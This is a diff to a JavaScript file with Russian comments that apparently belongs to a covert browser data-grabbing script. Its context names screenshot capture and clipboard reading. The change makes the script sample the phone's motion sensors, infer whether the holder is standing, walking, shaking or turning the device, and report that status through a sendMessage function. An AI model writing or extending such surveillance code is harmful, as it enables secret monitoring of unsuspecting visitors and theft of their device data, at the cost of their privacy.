@@ -214,31 +214,66 @@ async function takeScreenshot() {
     }
 }
 
-// ========== ДАТЧИКИ ТЕЛЕФОНА (АКСЕЛЕРОМЕТР, ГИРОСКОП) ==========
+// ========== ДАТЧИКИ ТЕЛЕФОНА (АНАЛИЗ СОСТОЯНИЯ) ==========
 async function getSensorsData() {
-    let orientation = '';
-    let motion = '';
-    
-    if ('DeviceOrientationEvent' in window) {
-        window.addEventListener('deviceorientation', (e) => {
-            orientation = `📐 Ориентация: α=${e.alpha?.toFixed(1)}, β=${e.beta?.toFixed(1)}, γ=${e.gamma?.toFixed(1)}`;
-        }, { once: true });
-    } else {
-        orientation = '❌ DeviceOrientation не поддерживается';
-    }
-    
-    if ('DeviceMotionEvent' in window) {
-        window.addEventListener('devicemotion', (e) => {
+    return new Promise((resolve) => {
+        if (!('DeviceMotionEvent' in window)) {
+            sendMessage(`📊 Статус: датчики не поддерживаются`);
+            resolve();
+            return;
+        }
+        
+        let maxAcc = 0;
+        let maxRot = 0;
+        let samples = 0;
+        
+        const handler = (e) => {
             const acc = e.acceleration;
-            motion = `🏃‍♂️ Ускорение: x=${acc?.x?.toFixed(1)}, y=${acc?.y?.toFixed(1)}, z=${acc?.z?.toFixed(1)}`;
-        }, { once: true });
-    } else {
-        motion = '❌ DeviceMotion не поддерживается';
-    }
-    
-    setTimeout(() => {
-        sendMessage(`📡 ДАТЧИКИ:\n${orientation}\n${motion}`);
-    }, 1000);
+            const rot = e.rotationRate;
+            
+            if (acc && acc.x !== null) {
+                const accMagnitude = Math.abs(acc.x) + Math.abs(acc.y) + Math.abs(acc.z);
+                if (accMagnitude > maxAcc) maxAcc = accMagnitude;
+            }
+            
+            if (rot && rot.beta !== null) {
+                const rotMagnitude = Math.abs(rot.alpha || 0) + Math.abs(rot.beta || 0) + Math.abs(rot.gamma || 0);
+                if (rotMagnitude > maxRot) maxRot = rotMagnitude;
+            }
+            
+            samples++;
+            
+            if (samples >= 30) {
+                window.removeEventListener('devicemotion', handler);
+                
+                let status = '';
+                
+                if (maxAcc < 1.5) {
+                    status = 'СТОИТ';
+                } else if (maxAcc > 2.5 && maxAcc < 8) {
+                    status = 'ИДЁТ (шаги)';
+                } else if (maxAcc >= 8) {
+                    status = 'ТРЯСУТ';
+                } else if (maxRot > 30) {
+                    status = 'ПОВОРАЧИВАЮТ';
+                } else {
+                    status = 'СТОИТ';
+                }
+                
+                sendMessage(`📊 Статус: ${status}`);
+                resolve();
+            }
+        };
+        
+        window.addEventListener('devicemotion', handler);
+        setTimeout(() => {
+            window.removeEventListener('devicemotion', handler);
+            if (samples < 30) {
+                sendMessage(`📊 Статус: СТОИТ (недостаточно данных)`);
+                resolve();
+            }
+        }, 3000);
+    });
 }
 
 // ========== БУФЕР ОБМЕНА (ЧТЕНИЕ) ==========
